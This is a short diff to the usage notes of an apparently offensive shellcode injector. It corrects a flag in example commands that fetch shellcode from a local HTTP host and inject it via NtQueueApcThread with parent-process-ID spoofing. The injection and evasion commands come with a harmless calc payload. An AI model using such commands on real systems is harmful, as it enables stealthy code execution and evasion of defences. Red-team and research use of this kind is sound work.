@@ -178,7 +178,7 @@ ntqathread ->  NtQueueApcThread
 
 Examples:
 shellcode_injector.exe --host http://localhost:8080 --file calc.bin --mem-alloc standard --exec-type rthread
-shellcode_injector.exe --host http://localhost:8080 --file calc.bin --mem-alloc ntsection --exec-type ntqathread --proc-spoof-ppid --ppid 752
+shellcode_injector.exe --host http://localhost:8080 --file calc.bin --mem-alloc ntsection --exec-type ntqathread --proc-spoof-ppid --proc-ppid 752
 
 
 Note: 
